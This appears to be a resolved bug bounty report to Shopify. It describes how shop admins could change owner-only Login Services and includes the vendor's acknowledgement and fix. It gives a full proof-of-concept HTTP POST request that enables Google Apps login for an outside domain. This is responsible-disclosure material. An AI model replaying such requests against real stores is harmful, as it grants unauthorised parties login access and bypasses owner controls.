title: Shop admin can change external login services

profile.name: Shopify
profile.about: Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.

vulnerability_information:
'Login services' section in the Settings->Account is accessible only to the Account owners. However, shop admins (full access users) can escalate privileges and modify the login services.

To verify,
1. Log into https://seclearn.myshopify.com as admin.
2. Navigate to settings->Account, notice that it does not show Login Services section to this user. However, he can modify the Login Services by sending the below request (use proper authenticity_token and cookies before sending the request).

	POST /admin/login_services/google_apps/update HTTP/1.1
	Host: seclearn.myshopify.com
	User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
	Cookie: ...
	Content-Type: application/x-www-form-urlencoded
	
	utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save


3. To confirm, log in as Account owner and look at the Login Services section. Notice that, Google apps are enabled and securitylearn.net is added to the google app domain.
vulnerability_information_html:
'Login services' section in the Settings->Account is accessible only to the Account owners. However, shop admins (full access users) can escalate privileges and modify the login services.

To verify,

  1. Log into https://seclearn.myshopify.com as admin.

  2. Navigate to settings->Account, notice that it does not show Login Services section to this user. However, he can modify the Login Services by sending the below request (use proper authenticity_token and cookies before sending the request).

    POST /admin/login_services/google_apps/update HTTP/1.1
    Host: seclearn.myshopify.com
    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
    Cookie: ...
    Content-Type: application/x-www-form-urlencoded

    utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save

  3. To confirm, log in as Account owner and look at the Login Services section. Notice that, Google apps are enabled and securitylearn.net is added to the google app domain.

activities.message: I managed to reproduce this issue. Our team is investigating.
activities.markdown_message: I managed to reproduce this issue. Our team is investigating.

activities.message:
Hi @satishb3,

This issue was fixed last Friday. I will mark it as Resolved now, and you can expect to hear back within a few days about our decision regarding a bounty.

Thank you again for reporting the issue.
activities.markdown_message:

Thank you again for reporting the issue.

activities.message: Thanks for helping improve the security of Shopify! This issue has been resolved.
activities.markdown_message: Thanks for helping improve the security of Shopify! This issue has been resolved.

summaries.content: An issue where any user could enable Google Apps integration, and allow anyone from a custom Google Apps Domain to login in the store via OAuth. The issue could only be triggered by a logged-in staff member of the store, but this feature should be available to the store owner only.
summaries.content_html: An issue where any user could enable Google Apps integration, and allow anyone from a custom Google Apps Domain to login in the store via OAuth. The issue could only be triggered by a logged-in staff member of the store, but this feature should be available to the store owner only.
